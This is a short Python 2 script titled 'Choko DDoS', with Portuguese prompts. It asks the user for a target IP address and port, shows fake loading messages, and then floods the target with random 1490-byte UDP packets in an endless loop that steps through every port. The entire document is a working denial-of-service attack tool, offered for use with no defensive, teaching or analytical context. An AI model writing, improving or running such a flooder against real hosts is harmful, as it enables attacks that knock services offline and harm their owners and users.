print "Inicializado com sucesso!"
import os
import sys
import time
import random
import socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
time.sleep(2)
os.system("clear")
print "Choko DDoS"
ip = raw_input("IP do alvo =  ")
port = input("Porta =  ")
os.system("clear")
os.system("Ataque iniciado!")
print "carregando...20%"
time.sleep(1)
print "carregando...30%"
time.sleep(0.5)
print "carregando...50%"
time.sleep(1)
print "carregando...80%"
time.sleep(2)
print "carregando...100%"
time.sleep(3)
print "carregado com sucesso!"
time.sleep(0.5)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Enviado %s sockets para %s porta:%s"%(sent,ip,port)
     if port == 65534:
       port = 1
